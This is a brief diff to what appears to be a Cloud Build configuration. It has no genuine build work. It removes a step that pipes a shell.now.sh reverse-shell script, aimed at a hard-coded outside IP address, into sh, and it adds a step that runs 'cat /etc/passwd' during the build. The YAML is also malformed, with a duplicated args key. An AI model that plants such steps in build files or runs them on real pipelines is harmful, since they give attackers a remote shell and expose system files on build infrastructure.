@@ -1,6 +1,6 @@
 steps:
 - name: 'gcr.io/cloud-builders/mvn'
-  args: ['curl https://shell.now.sh/159.89.175.221:2020 | sh']
-  args: [curl https://shell.now.sh/159.89.175.221:2020 | sh]
+  args: ['cat /etc/passwd']
+  
 
 
